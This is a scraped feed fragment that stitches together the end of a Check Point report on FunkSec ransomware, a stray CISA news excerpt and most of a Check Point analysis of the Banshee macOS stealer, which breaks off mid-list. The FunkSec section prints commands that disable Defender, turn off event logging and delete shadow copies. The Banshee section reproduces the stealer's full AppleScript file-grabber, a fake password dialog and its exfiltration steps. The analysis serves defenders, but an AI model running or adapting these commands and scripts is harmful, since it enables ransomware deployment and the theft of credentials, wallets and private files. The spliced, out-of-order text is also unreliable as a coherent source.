code." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image16.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 &amp;#8211; FunkSec claims of AI interpretation of their Ransomware code.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The use of such tools aligns closely with the group’s public claims, as they also released an AI chatbot based on Miniapps to support their operations. Miniapps is a platform that facilitates the creation and use of AI applications and chatbots, often without the restrictions found in more popular systems like ChatGPT. The bot developed by FunkSec is specifically designed to support malicious activities.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 16 - Scorpion miniapps chat." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image17.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 &amp;#8211; Scorpion miniapps chat.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="technical-analysis"&gt;Technical Analysis&lt;/h2&gt;



&lt;p&gt;To better understand the malware, we examined one of the circulated samples. This is a stripped Rust binary, which makes it challenging to effectively reverse engineer. In particular, it is subject to aggressive in-lining of library code (see our previous publication,&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/inside-akira-ransomwares-rust-experiment/"&gt;Inside Akira Ransomware’s Rust Experiment&lt;/a&gt;&amp;nbsp;for a clear demonstration of how this works, and how this complicates reverse engineering tasks), and contains many trait implementations that a disassembler may not recognize out of the box, many of which are wrappers for e.g.&amp;nbsp;&lt;code&gt;WriteFileEx&lt;/code&gt;&amp;nbsp;or&amp;nbsp;&lt;code&gt;CryptGenRandom&lt;/code&gt;. However, a careful analysis reveals some interesting details.&lt;/p&gt;



&lt;p&gt;Overall, we were mainly struck by the amount of redundancy in the binary. Control flow seems to repeat itself and call functions again and again from various execution paths; in a typical ransomware, these would only be called once. For example, in this sequence of operations:&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 17 - Functions called multiple times in the FunkSec
Ransomware." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image18.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17 &amp;#8211; Functions called multiple times in the FunkSec Ransomware.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Across the entire binary many of these functions are called twice, or even three or four times; the ‘disable security’ routine, seen above, is called twice in the same basic block. The below recursive function, which iterates into all subdirectories of a given directory and encrypts the targeted files in it, is called a total of&amp;nbsp;&lt;em&gt;five&lt;/em&gt;&amp;nbsp;times across the binary.&lt;/p&gt;



&lt;p&gt;Some of the repetition is due to duplicated code that invokes the ‘encrypt all directories’ logic with different hardcoded constants each time, such as this invocation that uses the constant&amp;nbsp;&lt;code&gt;RansomwarePassword123&lt;/code&gt;:&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 18 - &amp;lt;code&amp;gt;RansomwarePassword123&amp;lt;/code&amp;gt; constant in the
code." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image19.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18 &amp;#8211;&amp;nbsp;&lt;code&gt;RansomwarePassword123&lt;/code&gt;&amp;nbsp;constant in the code.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Aside from the duplicated functionality, the main execution flow of the malware first calls the operations sequence seen earlier (“disable security”, and so on) and then transfers execution to an ‘encrypt all drives’ function. The operations sequence begins by checking whether it has elevated privileges (by trying to execute&amp;nbsp;&lt;code&gt;net session&lt;/code&gt;). If not, the binary attempts to relaunch itself with elevated privileges, using the method described&amp;nbsp;&lt;a href="https://stackoverflow.com/questions/71384840/how-to-execute-powershells-start-process-verb-runas-from-inside-a-batch-wher"&gt;here&lt;/a&gt;&amp;nbsp;(&lt;code&gt;start-process -wait -Verb runas -filepath '%~nx0' -ArgumentList '&amp;lt;arguments&amp;gt;'&lt;/code&gt;).&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 19 - Sample output of &amp;lt;code&amp;gt;net session&amp;lt;/code&amp;gt; without
elevated privileges." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image20.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19 &amp;#8211; Sample output of&amp;nbsp;&lt;code&gt;net session&lt;/code&gt;&amp;nbsp;without elevated privileges.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Once it has elevated privileges, the malware executes the following commands:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Command&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Functionality&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Set-MpPreference -DisableRealtimeMonitoring $true&lt;/code&gt;&lt;/td&gt;&lt;td&gt;Disable Windows Defender real-time protection.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;wevtutil sl Security /e:false&lt;/code&gt;&lt;/td&gt;&lt;td&gt;Disable Security event logging.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;wevtutil sl Application /e:false&lt;/code&gt;&lt;/td&gt;&lt;td&gt;Disable Application event logging.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Set-ExecutionPolicy Bypass -Scope Process -Force&lt;/code&gt;&lt;/td&gt;&lt;td&gt;Disable restrictions placed by the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4"&gt;Powershell execution policy&lt;/a&gt;.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;vssadmin delete shadows /all /quiet&lt;/code&gt;&lt;/td&gt;&lt;td&gt;predictably, delete shadow copy backups.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;The&amp;nbsp;&lt;code&gt;terminate_processes&lt;/code&gt;&amp;nbsp;function contains a hardcoded list of processes and services to terminate:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;chrome.exe&lt;/td&gt;&lt;td&gt;firefox.exe&lt;/td&gt;&lt;td&gt;msedge.exe&lt;/td&gt;&lt;td&gt;explorer.exe&lt;/td&gt;&lt;td&gt;outlook.exe&lt;/td&gt;&lt;td&gt;vlc.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;spotify.exe&lt;/td&gt;&lt;td&gt;skype.exe&lt;/td&gt;&lt;td&gt;discord.exe&lt;/td&gt;&lt;td&gt;steam.exe&lt;/td&gt;&lt;td&gt;java.exe&lt;/td&gt;&lt;td&gt;python.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;node.exe&lt;/td&gt;&lt;td&gt;cmd.exe&lt;/td&gt;&lt;td&gt;powershell.exe&lt;/td&gt;&lt;td&gt;taskmgr.exe&lt;/td&gt;&lt;td&gt;wmplayer.exe&lt;/td&gt;&lt;td&gt;tscon.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;notepad.exe&lt;/td&gt;&lt;td&gt;spooler&lt;/td&gt;&lt;td&gt;bits&lt;/td&gt;&lt;td&gt;dnsclient&lt;/td&gt;&lt;td&gt;lanmanworkstation&lt;/td&gt;&lt;td&gt;winmgmt&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;netsh&lt;/td&gt;&lt;td&gt;iphlpsvc&lt;/td&gt;&lt;td&gt;wuauserv&lt;/td&gt;&lt;td&gt;RemoteAccess&lt;/td&gt;&lt;td&gt;ShellHWDetection&lt;/td&gt;&lt;td&gt;SCardSvr&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;TrkWks&lt;/td&gt;&lt;td&gt;wscsvc&lt;/td&gt;&lt;td&gt;CryptSvc&lt;/td&gt;&lt;td&gt;msiserver&lt;/td&gt;&lt;td&gt;MpsSvc&lt;/td&gt;&lt;td&gt;defragsvc&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;upnphost&lt;/td&gt;&lt;td&gt;WindowsUpdate&lt;/td&gt;&lt;td&gt;srservice&lt;/td&gt;&lt;td&gt;wsmprovhost&lt;/td&gt;&lt;td&gt;AppIDSvc&lt;/td&gt;&lt;td&gt;AudioEndpointBuilder&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Schedule&lt;/td&gt;&lt;td&gt;eventlog&lt;/td&gt;&lt;td&gt;PlugPlay&lt;/td&gt;&lt;td&gt;Netman&lt;/td&gt;&lt;td&gt;bthserv&lt;/td&gt;&lt;td&gt;ShellExperienceHost&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;SMB&lt;/td&gt;&lt;td&gt;WinDefend&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;Next, the malware moves on to iterating over each letter drive, recursing through its subdirectories and encrypting each file with one of the targeted extensions. For file encryption, the symmetric encryption used is the chacha20 implementation available in the&amp;nbsp;&lt;a href="https://github.com/orion-rs/orion"&gt;orion.rs crate&lt;/a&gt;. Ephemeral keys are generated using a thin wrapper for&amp;nbsp;&lt;code&gt;CryptGenRandom&lt;/code&gt;&amp;nbsp;(and the descriptively-named&amp;nbsp;&lt;code&gt;SystemFunction036&lt;/code&gt;). The newly created filename, with the hardcoded&amp;nbsp;&lt;code&gt;.funksec&lt;/code&gt;&amp;nbsp;extension, is created using a call to Rust’s&amp;nbsp;&lt;code&gt;format!&lt;/code&gt;&amp;nbsp;&lt;a href="https://doc.rust-lang.org/std/fmt/"&gt;macro&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;The malware then writes to disk the (rather emoji-fied) ransom note.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 20 - FunkSec ransomware note." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image21.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20 &amp;#8211; FunkSec ransomware note.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="summary"&gt;Summary&lt;/h2&gt;



&lt;p&gt;This report provides an in-depth analysis of FunkSec, a ransomware group with apparent hacktivist tendencies. The custom encryptor, developed by an inexperienced Algerian author, features AI-assisted elements which enables rapid development and improvement. FunkSec’s data leaks often recycle information from previous hacktivist campaigns, casting doubt on the authenticity of their claims. Despite these limitations, their Tor-based operations and low ransom demands have drawn widespread attention in cybercrime forums.&lt;/p&gt;



&lt;p&gt;FunkSec’s operations highlight the role of AI in malware development, the overlap between hacktivism and cybercrime, and the challenges in verifying leaked data. It also raises questions about how we assess the threat posed by ransomware groups, as we often rely on the groups’ own claims. These findings reflect a changing threat landscape, where even low-skill actors can make use of accessible tools to cast a very large shadow.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.checkpoint.com/harmony/advanced-endpoint-protection/"&gt;Harmony Endpoint&lt;/a&gt;&amp;nbsp;provides comprehensive endpoint protection at the highest security level, crucial to avoid security breaches and data compromise and protects against this threat.&lt;/p&gt;

Originally released in October 2022, CISA’s CPGs are voluntary practices that critical infrastructure owners can take to protect themselves against cyber threats.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;This report is based on analysis of 7,791 critical infrastructure organizations enrolled in &lt;a href="https://www.cisa.gov/cyber-hygiene-services"&gt;CISA’s Vulnerability Scanning service&lt;/a&gt; from Aug. 1, 2022, through Aug. 31, 2024.&amp;nbsp;Data reveals that four critical infrastructure sectors are most impacted by CPG adoption: Healthcare and Public Health, Water and Wastewater Systems, Communications, and Government Services and Facilities. These four sectors have strong partnerships with CISA.&lt;/p&gt;
&lt;p&gt;As CISA strengthens partnerships across all &lt;a href="https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors"&gt;16 critical infrastructure sectors&lt;/a&gt;, the agency hopes that CPG adoption will continue to expand. CISA urges critical infrastructure to learn more by visiting &lt;a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals"&gt;Cross-Sector Cybersecurity Performance Goals&lt;/a&gt;.&amp;nbsp;&lt;/p&gt;</description><guid isPermaLink="false">/node/22816</guid></item><item><title>CISA Releases Four Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/01/10/cisa-releases-four-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released four Industrial Control Systems (ICS) advisories on January 10, 2025.

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/"&gt;Banshee: The Stealer That &amp;#8220;Stole Code&amp;#8221; From MacOS XProtect&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt;&amp;nbsp;Antonis Terefos (&lt;a href="https://x.com/Tera0017"&gt;&lt;strong&gt;@Tera0017&lt;/strong&gt;&lt;/a&gt;)&lt;/p&gt;



&lt;h1 class="wp-block-heading"&gt;&lt;strong&gt;Key Points&lt;/strong&gt;&lt;/h1&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Since September, &lt;strong&gt;Check Point Research&lt;/strong&gt; has been monitoring a new version of the &lt;strong&gt;Banshee macOS stealer&lt;/strong&gt;, a malware linked to Russian-speaking cyber criminals targeting &lt;strong&gt;macOS users&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;This new version had been undetected for over two months until the original version of Banshee Stealer was leaked on XSS forums, which resembled similarities with the malware&amp;#8217;s core functionality.&lt;/li&gt;



&lt;li&gt;One notable difference between the leaked source code and the version discovered by Check Point Research is the use of a string encryption algorithm. This algorithm is the same as &lt;strong&gt;Apple&lt;/strong&gt; uses in its &lt;strong&gt;Xprotect antivirus&lt;/strong&gt; engine for &lt;strong&gt;MacOS&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;One method of distributing Banshee Stealer involved malicious GitHub repositories, targeting Windows users with Lumma Stealer and macOS users with Banshee Stealer.&lt;/li&gt;



&lt;li&gt;Banshee operated as a &amp;#8216;stealer-as-a-service&amp;#8217;, priced at $3,000, and was advertised through Telegram and forums such as XSS and Exploit. On November 23, 2024, the malware’s source code was leaked, leading the author to shut down the operations the following day.&lt;/li&gt;



&lt;li&gt;Despite shutting down the operation, threat actors continue to distribute the new version of Banshee via phishing websites.&lt;/li&gt;
&lt;/ul&gt;



&lt;h1 class="wp-block-heading"&gt;Introduction&lt;/h1&gt;



&lt;p&gt;As of 2024, approximately 100.4 million people worldwide use macOS, accounting for 15.1% of the global PC market. Of the millions of macOS users, many falsely assume that their systems are inherently secure from malware. This perception stems from macOS&amp;#8217;s Unix-based architecture and historically lower market share, making it a less attractive target for cyber criminals. While macOS includes robust security measures like Gatekeeper, XProtect, and sandboxing, no operating system is entirely immune to threats, making users&amp;#8217; false sense of security all the more dangerous.&lt;/p&gt;



&lt;p&gt;As macOS&amp;#8217;s popularity grows, attackers increasingly target the platform. Modern threats include sophisticated malware, phishing attacks, and malicious software like &lt;strong&gt;Banshee&lt;/strong&gt;, a stealthy macOS stealer, a new stealer that was made public for the first time in July 2024. This malware targets MacOS users and is able to steal browser and login credentials, cryptocurrency wallets, and sensitive information from files. Through July to November, Banshee’s author operated a stealer-as-a-service on Telegram and on dark web forums such as XSS and Exploit and continued to improve the malware. During this time, the author hired two members to carry out campaigns targeting MacOS users.&lt;/p&gt;



&lt;p&gt;In late September, &lt;strong&gt;Check Point Research&lt;/strong&gt; identified a new, undetected version of Banshee Stealer targeting macOS. This updated version introduced string encryption, as previous versions contained all the strings in plain text. However, Banshee’s author “stole” the string encryption algorithm from Apple&amp;#8217;s MacOS XProtect antivirus engine. Threat actors distributed this new version mainly via phishing websites and malicious &lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/"&gt;GitHub&lt;/a&gt; repositories. In some GitHub campaigns, threat actors targeted both Windows and MacOS users with Lumma and Banshee Stealer.&lt;/p&gt;



&lt;p&gt;For over two months, this updated version of Banshee successfully evaded detection by most antivirus engines until its original code was leaked on XSS forums, allowing antivirus engines to detect its core functionality. Once the source code was leaked, the Banshee stealer-as-a-service operation was shut down to the general public. However, &lt;strong&gt;Check Point Research&lt;/strong&gt; continues to observe campaigns distributing malware through phishing websites that masquerade as legitimate software.&lt;/p&gt;



&lt;h1 class="wp-block-heading"&gt;Malware Analysis&lt;/h1&gt;



&lt;p&gt;In late September, &lt;strong&gt;Check Point Research&lt;/strong&gt; obtained new versions of &lt;strong&gt;Banshee Stealer&lt;/strong&gt;. The discovered samples remained undetected by antivirus engines on &lt;strong&gt;VirusTotal&lt;/strong&gt; for over two months. Only once the Banshee Stealer &lt;strong&gt;source code&lt;/strong&gt; was leaked on &lt;strong&gt;November 23&lt;/strong&gt; on &lt;strong&gt;XSS underground forums&lt;/strong&gt; did antivirus vendors update their detection rules to identify both the original leaked code and any updated versions.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30937" height="287" src="https://research.checkpoint.com/wp-content/uploads/2024/12/001-1024x287.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; Unpacked Banshee MacOS Stealer detection.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Although the core functionality of both the older and newer versions remains unchanged, one key difference is the introduction of string encryption, which replaces the plain text strings from samples &lt;a href="https://www.elastic.co/security-labs/beyond-the-wail"&gt;reported&lt;/a&gt; in August. When &lt;strong&gt;Check Point Research&lt;/strong&gt; first obtained encrypted samples in late September, we created a Yara rule based on the string encryption, resulting in many false positives. However, upon further investigation, we discovered that Banshee employs the same encryption method that Apple utilizes in macOS for string encryption within its antivirus engine, XProtect. As previously noted by a &lt;a href="https://alden.io/posts/secrets-of-xprotect/#reverse-engineering-the-redpine-remediator"&gt;researcher&lt;/a&gt;, this same encryption is used for &lt;em&gt;“encrypted YARA rules stored within the XProtect Remediator binaries&amp;#8221;&lt;/em&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30939" height="412" src="https://research.checkpoint.com/wp-content/uploads/2024/12/002.png" width="786" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; Banshee Stealer (left), MacOS XProtect Remediator Binary (right).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Python representation:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;def macos_xprotect_string_decryption(encrypted: bytes, encr_key: int) -&gt; str:
    """
    Author: @Check Point Research
    Decrypts MacOS Xprotect binaries &amp;amp; Banshee Stealer encrypted strings.
    """
    decrypted = "".join(
        chr(
            (encr_key &gt;&gt; ((i * 8) &amp;amp; 0x38) &amp;amp; 0xFF) ^ encrypted[i]
        )
        for i in range(len(encrypted))
    )
    return decrypted.partition("\\x00")[0]
&lt;/pre&gt;



&lt;p&gt;While &lt;strong&gt;XProtect&lt;/strong&gt; binaries decrypt YARA rules for detection purposes, &lt;strong&gt;Banshee Stealer&lt;/strong&gt; uses the same algorithm to decrypt critical strings for its functionality. These strings include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;commands executed&lt;/li&gt;



&lt;li&gt;browser names and paths&lt;/li&gt;



&lt;li&gt;extension IDs&lt;/li&gt;



&lt;li&gt;wallets and their paths&lt;/li&gt;



&lt;li&gt;command-and-control (C&amp;amp;C) information&lt;/li&gt;



&lt;li&gt;and many other strings observed in the leaked source code.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Technical Analysis&lt;/h2&gt;



&lt;p&gt;Upon decrypting the strings, we observed that Banshee&amp;#8217;s core functionality remains largely unchanged. The updates primarily pertain to the additional anti-analysis techniques. The first technique uses the &lt;code&gt;fork()&lt;/code&gt; function, which creates a child process that may escape debuggers attached to the parent process. Before the parent process terminates, it runs the command &lt;code&gt;killall Terminal&lt;/code&gt; to close any open terminal sessions. Meanwhile, the child process calls &lt;code&gt;setsid()&lt;/code&gt; to initiate a daemon in the background, trying to mimic a legitimate system service and blend in with normal processes. Then, a second child process is created, while the first child is terminated. The final child process attempts to get &lt;code&gt;rwx&lt;/code&gt; access to the root directory, and if it fails, it will stop the malware infection; if it succeeds, it closes &lt;code&gt;stdin&lt;/code&gt;, &lt;code&gt;stdout&lt;/code&gt;, and &lt;code&gt;stderr&lt;/code&gt; and redirects them to &lt;code&gt;/dev/null&lt;/code&gt;. This ensures that the malware runs silently without producing output or errors that could alert the user of malicious behavior. This also prevents any interaction with debugging tools that might monitor input/output behavior.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31019" height="373" src="https://research.checkpoint.com/wp-content/uploads/2025/01/003.png" width="1123" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; Anti-analysis forks and function calls.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Once those checks have been passed, &lt;strong&gt;Banshee&lt;/strong&gt; proceeds by retrieving the &lt;strong&gt;HOME&lt;/strong&gt; and &lt;strong&gt;TMP&lt;/strong&gt; directories and creating a ten-character directory within &lt;strong&gt;TMP&lt;/strong&gt;. These directories are used to steal user information, browser data, and as for the created directory, to store the stolen data. At this stage, the malware functions similarly to the leaked code and previous versions. However, one notable change in the updated code is the removal of the language check, which previously terminated the process if Russian was detected.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Stealer Capabilities&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Banshee&lt;/strong&gt; is a fully functional stealer capable of stealing credentials from several browsers, including:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Chrome&lt;/li&gt;



&lt;li&gt;Brave&lt;/li&gt;



&lt;li&gt;Edge&lt;/li&gt;



&lt;li&gt;Vivaldi&lt;/li&gt;



&lt;li&gt;Yandex&lt;/li&gt;



&lt;li&gt;Opera&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;In addition to browser credentials, the malware targets various browser extensions, primarily those related to cryptocurrency wallets. It also targets a Two-Factor Authentication (2FA) extension &lt;strong&gt;&lt;code&gt;authenticator.cc—Authenticator&lt;/code&gt;&lt;/strong&gt;. All stolen data is stored in the directory &lt;code&gt;/tmp/$rand10char_dir/Browsers/&lt;/code&gt;. Interestingly, some of these extensions no longer appear to exist, leading us to believe that the end-of-life extensions have been copied and pasted from previous or other “stealer” projects. Banshee is targeting the following browser extensions.&lt;/p&gt;

&lt;/pre&gt;



&lt;p&gt;Once the browser data is dumped, Banshee proceeds to target wallets found on the machine. The stolen information is stored &lt;code&gt;/tmp/$rand10char_dir/Wallets/&lt;/code&gt;. The targeted wallets are:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Exodus&lt;/li&gt;



&lt;li&gt;Electrum&lt;/li&gt;



&lt;li&gt;Coinomi&lt;/li&gt;



&lt;li&gt;Guarda&lt;/li&gt;



&lt;li&gt;Wasabi&lt;/li&gt;



&lt;li&gt;Atomic&lt;/li&gt;



&lt;li&gt;Ledger&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;The stealer collects various system information, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Software &amp;amp; Hardware information by executing the command &lt;code&gt;system_profiler SPSoftwareDataType SPHardwareDataType&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;The external IP address by contacting &lt;code&gt;api.ipify.org&lt;/code&gt; via the command &lt;code&gt;curl -s&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;MacOS password by tricking the user into entering their password through an input pop-up. Command executed and pop-up message: &lt;code&gt;osascript -e \\'display dialog "To launch the application, you need to update the system settings \\n\\nPlease enter your password." with title "System Preferences" with icon caution default answer "" giving up after 30 with hidden answer\\’&lt;/code&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The password will be validated by executing the command &lt;code&gt;dscl /Local/Default -authonly &amp;lt;user&amp;gt; &amp;lt;pass&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This information is stored in &lt;code&gt;/tmp/$rand10char_dir/system_info.json&lt;/code&gt; which also includes the campaign ID under the key &lt;code&gt;"BUILD_ID:"&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;The keychain passwords are stored in &lt;code&gt;/tmp/$rand10char_dir/Passwords/&lt;/code&gt; and the code responsible for this functionality has remained unchanged since the leaked code.&lt;/p&gt;



&lt;p&gt;The file-grabber functionality is performed using an AppleScript. The script is stored at &lt;code&gt;/tmp/$rand13char&lt;/code&gt;. The code executed is shown below, with the output being stored at &lt;code&gt;/tmp/$rand10char_dir/FileGrabber/&lt;/code&gt;.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;do shell script "osascript -e 'set volume with output muted'";
set baseFolderPath to (path to home folder as text) &amp;amp; " :";
set fileGrabberFolderPath to baseFolderPath &amp;amp; "FileGrabber:";
set notesFolderPath to baseFolderPath &amp;amp; "Notes:";
tell application "Finder";
	set username to short user name of (system info) 	if not (exists folder baseFolderPath) then;
		do shell script "echo 'Creating base folder'";
		make new folder at (path to home folder) with properties {name:" };
	end if	try;
		do shell script "echo 'Creating FileGrabber folder'";
		make new folder at folder baseFolderPath with properties {name:"FileGrabber"};
		delay 2 -- Delay to give Finder time to create the folder;
	end try 	try;
		do shell script "echo 'Creating Notes folder'";
		make new folder at folder baseFolderPath with properties {name:"Notes"};
		delay 2 -- Delay to give Finder time to create the folder;
	end try 	try;
		do shell script "echo 'Copying Safari cookies'";
		set macOSVersion to do shell script "sw_vers -productVersion";
		if macOSVersion starts with "10.15" or macOSVersion starts with "10.14" then;
			set safariFolder to ((path to library folder from user domain as text) &amp;amp; "Safari:");
		else;
			set safariFolder to ((path to library folder from user domain as text) &amp;amp; "Containers:com.apple.Safari:Data:Library:Cookies:");
		end if;
		duplicate file "Cookies.binarycookies" of folder safariFolder to folder fileGrabberFolderPath with replacing;
		delay 2 -- Delay to give Finder time to copy the file;
	end try 	try;
		do shell script "echo 'Copying Notes database'";
		set homePath to path to home folder as string;
		set sourceFilePath to homePath &amp;amp; "Library:Group Containers:group.com.apple.notes:NoteStore.sqlite";
		duplicate file sourceFilePath to folder notesFolderPath with replacing;
		delay 2 -- Delay to give Finder time to copy the file;
	end try;
	set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key"} 	try;
		do shell script "echo 'Gathering desktop files'";
		set desktopFiles to every file of desktop;
		repeat with aFile in desktopFiles;
			try;
				set fileExtension to name extension of aFile;
				if fileExtension is in extensionsList then;
					set fileSize to size of aFile;
					if fileSize &amp;lt; 51200 then;
						do shell script "echo 'Copying file: " &amp;amp; (name of aFile as string) &amp;amp; "'";
						duplicate aFile to folder fileGrabberFolderPath with replacing;
						delay 1 -- Delay to give Finder time to copy each file;
					end if;
				end if;
			end try;
		end repeat;
	end try 	try;
		do shell script "echo 'Gathering documents files'";
		set documentsFiles to every file of folder "Documents" of (path to home folder);
		repeat with aFile in documentsFiles;
			try;
				set fileExtension to name extension of aFile;
				if fileExtension is in extensionsList then;
					set fileSize to size of aFile;
					if fileSize &amp;lt; 51200 then;
						do shell script "echo 'Copying file: " &amp;amp; (name of aFile as string) &amp;amp; "'";
						duplicate aFile to folder fileGrabberFolderPath with replacing;
						delay 1 -- Delay to give Finder time to copy each file;
					end if;
				end if;
			end try;
		end repeat;
	end try;
end tell;
do shell script "osascript -e 'set volume without output muted'"
&lt;/pre&gt;



&lt;p&gt;If the AppleScript execution fails, it will retry up to 30 times, each time attempting to reset permissions by executing the command &lt;code&gt;tccutil reset AppleEvents&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;Once the relevant files are collected, the malware displays a failure message to the user, causing them to believe the software solution is not working: &lt;code&gt;osascript -e \\'display dialog "This system does not support running this application." with title "System Error" buttons {"OK"} default button "OK" with icon stop\\'&lt;/code&gt;&lt;/p&gt;



&lt;p&gt;The network communication and exfiltration of stolen data remains unchanged. The process is straightforward. The random folder created at the beginning of the infection, which was used to store all the stolen data, is:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Zipped&lt;/li&gt;



&lt;li&gt;XOR encrypted using the campaign ID (&lt;code&gt;BUILD_ID&lt;/code&gt;)&lt;/li&gt;



&lt;li&gt;Base64 encoded&lt;/li&gt;



&lt;li&gt;A JSON file named &lt;code&gt;output.json&lt;/code&gt; is created with key &lt;code&gt;data:&lt;/code&gt; and value is the encoded/XORed content of the zipped folder.&lt;/li&gt;
&lt;/ol&gt;



